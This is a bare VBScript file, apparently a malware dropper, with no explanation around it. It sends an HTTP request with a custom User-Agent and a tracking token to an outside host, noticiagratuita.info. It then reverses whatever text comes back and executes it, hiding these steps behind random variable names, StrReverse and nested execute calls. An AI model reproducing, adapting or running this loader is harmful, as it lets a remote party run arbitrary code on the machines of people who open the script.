set RzKgn=CreateObject("Msxml2.xmlhttp")
vBGn5="8TOkeOicRCnrMqYHUp99CYqfu"
RzKgn.open StrReverse("PO ST") , "http://noticiagratuita.info/?join=hugr&" & vBGn5 ,false
execute("RzKgn.setRequestHeader ""User-Agent"", ""MyCustomUser"":RzKgn.setRequestHeader ""content-type"", ""application/x-www-form-urlencoded"":RzKgn.send ""join=open"":B=StrReverse(RzKgn.responseText):execute(B)")
